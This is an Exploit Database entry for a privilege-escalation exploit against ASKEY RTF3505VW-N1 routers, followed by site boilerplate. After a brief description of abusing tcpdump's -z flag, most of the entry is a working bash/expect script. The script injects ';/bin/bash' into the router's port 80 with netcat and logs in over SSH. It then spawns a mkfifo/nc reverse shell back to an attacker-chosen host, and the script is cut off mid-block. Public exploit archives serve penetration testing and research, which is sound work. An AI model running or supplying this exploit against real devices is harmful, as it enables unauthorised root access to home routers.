# Exploit Title: ASKEY RTF3505VW-N1 - Privilege escalation
# Date: 07-12-2022
# Exploit Author: Leonardo Nicolas Servalli
# Vendor Homepage: www.askey.com
# Platform: ASKEY router devices RTF3505VW-N1
# Tested on: Firmware BR_SV_g000_R3505VMN1001_s32_7
# Vulnerability analysis: https://github.com/leoservalli/Privilege-escalation-ASKEY/blob/main/README.md

#Description:
#----------

# Mitrastar ASKEY RTF3505VW-N1 devices are provided with access through ssh into a restricted default shell (credentials are on the back of the router and in some cases this routers use default credentials).

# The command “tcpdump” is present in the restricted shell and do not handle correctly the -z flag, so it can be used to escalate privileges through the creation of a local file in the /tmp directory of the router, and injecting packets through port 80 used for the router's Web GUI) with the string ";/bin/bash" in order to be executed by "-z sh". By using “;/bin/bash” as injected string we can spawn a busybox/ash console.

#Exploit:
#--------
#!/usr/bin/bash

if [ -z "$@" ]; then
	echo "Command example: $0 routerIP routerUser routerPassword remoteIPshell remotePortShell "
	exit 0
fi

for K in $(seq 1 15) 	# Attemps
do

echo "**************************************************************************************"
echo "******************************** Attempt number $K ************************************"
echo "**************************************************************************************"

for l in $(seq 1 200) ; do echo ";/bin/bash" | nc -p 8888 $1 80 ; done > /dev/null 2>&1 &	# start a background loop injecting the string ";/bin/bash" on the port 80 of the router

# Expect script for interact with the router through SSH, login, launch the tcpdump with the option "-z sh", and finally launch a more stable busybox reverse shell to our listener
/usr/bin/expect << EOD
	spawn ssh $2@$1
	expect 	{
		"password: " {
		send "$3\r"
		expect ">"
		send -- "tcpdump -v -ln -i any -w /tmp/runme$K -W 1 -G 1 -z sh src port 8888\r"		# filter by source port 8888
		}
		"yes/no" {
		send "yes\r"
		#exp_continue
		}
	}
	set timeout 2
	expect 	{
    		timeout {
        	puts "Timeout..."
        	send "exit\r"
        	exit 0
	    	}

		"*usy*ox" {
	        expect "#"
	        send "rm /tmp/runme* \r"
		send "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f | /bin/sh -i 2>&1|nc $4 $5 >/tmp/f \r"

	        set timeout -1
	        expect "NEVER_APPEARING_STRING#"            # wait an infinite time to mantain the rverse shell open

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/?utm_source=edb&utm_medium=web&utm_campaign=www), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google H...
